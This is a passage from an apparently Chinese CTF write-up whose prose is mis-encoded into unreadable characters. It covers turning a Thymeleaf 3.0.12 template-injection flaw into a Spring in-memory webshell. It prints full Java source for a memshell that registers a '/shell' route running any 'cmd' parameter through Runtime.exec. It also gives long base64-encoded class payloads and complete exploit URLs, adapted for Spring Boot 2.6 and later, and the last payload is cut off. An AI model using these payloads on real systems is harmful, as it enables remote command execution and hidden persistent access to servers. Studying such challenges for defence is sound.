HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯éœ€è¦åŠ è½½å­—èŠ‚ç ï¼Œè¿™é‡Œç”¨çš„æ˜¯org.springframework.cglib.core.ReflectUtils#defineClassæ–¹æ³•ï¼Œåªè¦ä¼ å…¥ ç±»åã€ç±»çš„å­—èŠ‚ç å­—èŠ‚æ•°ç»„ å’Œ ç±»åŠ è½½å™¨å°±å¯ä»¥åŠ è½½æ¶æ„ç±»ã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸Šé¢å†™çš„doInjectæ–¹æ³•æ¥æ³¨å…¥å†…å­˜é©¬ï¼Œè¯¥æ–¹æ³•çš„å‚æ•°éœ€è¦ä¼ å…¥beanå¯¹è±¡ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼æ¥è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>).getBean(T (Class).forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>))<br></code></pre></td></tr></table></figure><p>å…¶ç­‰æ•ˆäº</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>));<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T (org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&quot;SpringRequestMappingMemshell&quot;</span>,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(<span class="hljs-string">&quot;SpringRequestMappingMemshell.classçš„UrlSafebase64ç¼–ç &quot;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>).getBean(T (Class).forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>)))<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†decodeFromUrlSafeStringæ–¹æ³•å¤„ç†ï¼Œå’ŒTomcat9å¯¹urlçš„ç‰¹æ®Šå­—ç¬¦å¤„ç†æœ‰å…³ï¼Œè¿™æ˜¯å› ä¸ºè¿™é¢˜è¦æ‰“çš„å½¢å¼æ˜¯&#x2F;doc&#x2F;payloadçš„å½¢å¼ï¼Œpayloadé‡Œé¢åŒ…å«äº†&#x2F;ï¼Œtomcatä¼šè®¤ä¸ºè¿™æ˜¯è·¯å¾„åˆ†å‰²ç¬¦å·ï¼Œå¯¼è‡´404ï¼Œå¦‚æœç¼–ç ä¸º%2Få°±ä¼šæŠ¥400é”™è¯¯</p><p>ç”±äºSpringRequestMappingMemshell ç¼–è¯‘åçš„class æ–‡ä»¶ç»è¿‡base64åé‡Œé¢å¯èƒ½ä¼šæœ‰&#x2F; è¿™ä¸ªå­—ç¬¦ï¼Œå› æ­¤è¦ä½¿ç”¨<strong>org.springframework.util.Base64Utils.encodeToUrlSafeString</strong> å…ˆå°†SpringRequestMappingMemshell.class å¤„ç†æˆèƒ½å¤Ÿç”¨åœ¨url ä¼ è¾“çš„base64ç¼–ç ã€‚ç„¶åå†ä½¿ç”¨<strong>org.springframework.util.Base64Utils.decodeFromUrlSafeString</strong> è¿›è¡Œè§£ç æ“ä½œã€‚</p><p>è½¬å˜ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes= Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;SpringRequestMappingMemshell.class&quot;</span>).toPath());<br><span class="hljs-type">String</span> <span class="hljs-variable">safecode</span> <span class="hljs-operator">=</span> Base64Utils.encodeToUrlSafeString(bytes);<br>System.out.println(safecode);<br></code></pre></td></tr></table></figure><p>payload ä¸­åŒ…å«[ ] ç‰¹æ®Šå­—ç¬¦,éœ€è¦URLç¼–ç ä¸€ä¸‹-&gt; %5Bå’Œ%5Dï¼Œæˆ–è€…payloadé‡Œé¢çš„java.net.URL[0] ä¹Ÿå¯ä»¥ç”¨java.net.URL(â€œhttpâ€,â€127.0.0.1â€,â€1.txtâ€)è¿›è¡Œæ›¿ä»£ï¼Œè¿™ä¸ªéšä¾¿å†™å°±è¡Œä¸å½±å“ã€‚</p><p>æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/;/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAkwoABgBOCABPCgAGAFAIADAHAFEHAFIHAFMKAAUAVAoABwBVBwBWCAAyBwBXCgAFAFgHAFkIAFoKAA4AWwcAXAcAXQoAEQBeBwBfCgAUAGAKAAoATgoABwBhCABiBwBjCgAZAGQIAGUHAGYKAGcAaAoAZwBpCgBqAGsKABwAbAgAbQoAHABuCgAcAG8HAHAJAHEAcgoAJABzAQAGPGluaXQ-AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAGHBhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA_TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABJMamF2YS9sYW5nL09iamVjdDsBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBSBwBXBwBjAQAQTWV0aG9kUGFyYW1ldGVycwEAPShMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAANjbWQBAApleGVjUmVzdWx0AQAKRXhjZXB0aW9ucwcAdAEAIlJ1bnRpbWVWaXNpYmxlUGFyYW1ldGVyQW5ub3RhdGlvbnMBADZMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RQYXJhbTsBAAV2YWx1ZQEAClNvdXJjZUZpbGUBACFTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsLmphdmEMACcAKAEADGluamVjdC1zdGFydAwAdQB2AQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAwAdwB4DAB5AHoBABxTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsAQAQamF2YS9sYW5nL1N0cmluZwwAewB4AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAAi8qDAAnAHwBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMACcAfQEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MACcAfgwAfwCAAQAOaW5qZWN0LXN1Y2Nlc3MBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACBACgBAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAggwAgwCEDACFAIYHAIcMAIgAiQwAJwCKAQACXEEMAIsAjAwAjQCOAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCPDACQAJEMACcAkgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBABFnZXREZWNsYXJlZE1ldGhvZAEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEB9ihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0NvbnN1bWVzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RDb25kaXRpb247KVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAjb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXMBAAJPSwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czsBADooTGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOylWACEACgAGAAAAAAADAAEAJwAoAAEAKQAAAC8AAQABAAAABSq3AAGxAAAAAgAqAAAABgABAAAADAArAAAADAABAAAABQAsAC0AAAAJAC4ALwACACkAAAFZAAkABwAAAJQSAkwqtgADEgQGvQAFWQMSBlNZBBIGU1kFEgdTtgAITSwEtgAJEgoSCwS9AAVZAxIMU7YADU67AA5ZBL0ADFkDEg9TtwAQOgS7ABFZA70AErcAEzoFuwAUWRkEGQUBAQEBAbcAFToGLCoGvQAGWQMZBlNZBLsAClm3ABZTWQUtU7YAF1cSGEynAAtNLLYAGhIbTCuwAAEAAwCHAIoAGQADACoAAAA6AA4AAAAOAAMAEAAgABEAJQASADYAEwBIABQAVQAVAGcAFgCEABcAhwAbAIoAGACLABkAjwAaAJIAHAArAAAAUgAIACAAZwAwADEAAgA2AFEAMgAxAAMASAA_ADMANAAEAFUAMgA1ADYABQBnACAANwA4AAYAiwAHADkAOgACAAAAlAA7ADwAAAADAJEAPQA-AAEAPwAAABMAAv8AigACBwBABwBBAAEHAEIHAEMAAAAFAQA7AAAAAQAyAEQABAApAAAAaAAEAAMAAAAmuwAcWbgAHSu2AB62AB-3ACASIbYAIrYAI027ACRZLLIAJbcAJrAAAAACACoAAAAKAAIAAAAgABoAIQArAAAAIAADAAAAJgAsAC0AAAAAACYARQA-AAEAGgAMAEYAPgACAEcAAAAEAAEASABDAAAABQEARQAAAEkAAAAMAQABAEoAAQBLcwBFAAEATAAAAAIATQ==&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214230321805.png" alt="image-20241214230321805"></p><p><img src="https://cdn.clown2024.cn/image-20241214230307833.png" alt="image-20241214230307833"></p><h1 id="ä¸€é¢˜ä¸å‡ºç½‘çš„thymeleaf"><a href="#ä¸€é¢˜ä¸å‡ºç½‘çš„Thymeleaf" class="headerlink" title="ä¸€é¢˜ä¸å‡ºç½‘çš„Thymeleaf"></a>ä¸€é¢˜ä¸å‡ºç½‘çš„Thymeleaf</h1><p><img src="https://cdn.clown2024.cn/image-20241214230438476.png" alt="image-20241214230438476"></p><p>è¿™é¢˜ç»™çš„ä¹Ÿæ˜¯ä¸€ä¸ª3.0.12çš„Thymeleafï¼Œæ˜¯ä¸€ä¸ªè·¯å¾„æ‹¼æ¥å¯¼è‡´çš„æ¼æ´</p><p>ä¸€å¼€å§‹æˆ‘æƒ³ç€è¿™ä¸æ˜¯ç›´æ¥ç§’äº†å—ï¼Œå‘ç°å†…å­˜é©¬æ‰“ä¸è¿›å»ï¼Œæ‰“è¿‡å»ç›´æ¥400äº†</p><p><img src="https://cdn.clown2024.cn/image-20241214230714610.png" alt="image-20241214230714610"></p><p>åŸå› å‡ºåœ¨å†…å­˜é©¬è¿™é‡Œï¼Œè¿™é¢˜ç›®çš„springbootç‰ˆæœ¬æ¯”å‰é¢æœ¬åœ°æµ‹è¯•çš„è¦é«˜ï¼Œæ˜¯2.7.5çš„ç‰ˆæœ¬ï¼Œæˆ‘ä»¬æ¢åˆ°è¯¥ç‰ˆæœ¬ï¼Œçœ‹ä¸€ä¸‹æœ¬åœ°æ‰“æ˜¯ä»€ä¹ˆæŠ¥é”™</p><p><img src="https://cdn.clown2024.cn/image-20241214231157729.png" alt="image-20241214231157729"></p><p>ç„¶åå»æœäº†æœå‘ç°ä¸åŒç‰ˆæœ¬çš„springå†…å­˜é©¬æ˜¯æœ‰å·®åˆ«çš„ï¼ŒæŸ¥æ¼è¡¥ç¼ºäº†ä¸€ä¸‹ï¼Œä¸è¿‡ä¼¼ä¹åªæ˜¯å¯¹controlleræœ‰å½±å“ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html</a></p><p>å‰é¢çš„å†…å­˜é©¬æ˜¯é€‚åˆ&lt;2.6.0ç‰ˆæœ¬çš„springï¼Œ2.6.0ä¹‹åå®˜æ–¹ä¿®æ”¹äº†urlè·¯å¾„çš„é»˜è®¤åŒ¹é…ç­–ç•¥ï¼Œéœ€è¦é‡æ–°æ„é€ å†…å­˜é©¬äº†ï¼Œæ–‡ç« ä¸­çš„å†…å­˜é©¬å½¢å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>configField.setAccessible(<span class="hljs-literal">true</span>);<br>RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController2.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br><span class="hljs-type">InjectToController2</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController2</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªæŠŠå‰é¢çš„å†…å­˜é©¬é­”æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆä¸‹é¢è¿™æ ·å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshellChange</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;?&gt; requestMappingHandlerMappingClass = requestMappingHandlerMapping.getClass();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> requestMappingHandlerMappingClass.getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>            configField.setAccessible(<span class="hljs-literal">true</span>);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerMapping</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getMethod(<span class="hljs-string">&quot;registerMapping&quot;</span>, Object.class, Object.class, Method.class);<br>            registerMapping.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshellChange.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">methodsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br><br>            registerMapping.invoke(requestMappingHandlerMapping, info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshellChange</span>(), executeCommand);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;)</span> String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/admin?language=__$%7BT%20(org.springframework.cglib.core.ReflectUtils).defineClass(%22SpringRequestMappingMemshellChange%22,T%20(org.springframework.util.Base64Utils).decodeFromUrlSafeString(%22yv66vgAAADQAsAoACwBaCABbCgALAFwIADgKAAoAXQoAXgBfCgBeAGAHAGIIADwHAGMHAGQHAGUKAAoAZgoADABfBwBnCAA-BwBoCgAKAGkHAGoHAGsKABMAbAgAbQoAYQBuCwBvAHALAG8AcQoADwBaCgAMAHIIAHMHAHQKAB0AdQgAdgcAdwoAeAB5CgB4AHoKAHsAfAoAIAB9CAB-CgAgAH8KACAAgAcAgQkAggCDCgAoAIQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJExTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsQ2hhbmdlOwEACGRvSW5qZWN0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsBACFyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NvbmZpZ0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAEaW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAZAcAaAcAdAEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAIUBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAnU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbENoYW5nZS5qYXZhDAArACwBAAxpbmplY3Qtc3RhcnQMAIYAhwwAiACJBwCKDACLAIwMAI0AjgcAjwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kDACQAJEBACJTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsQ2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwwAkgCRAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAArAJMBAAYvc2hlbGwMAJQAlgcAlwwAmACZDACaAJsMAJwAnQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAngAsAQAMaW5qZWN0LWVycm9yAQARamF2YS91dGlsL1NjYW5uZXIHAJ8MAKAAoQwAogCjBwCkDAClAKYMACsApwEAAlxBDACoAKkMAKoAqwEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcArAwArQCuDAArAK8BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9y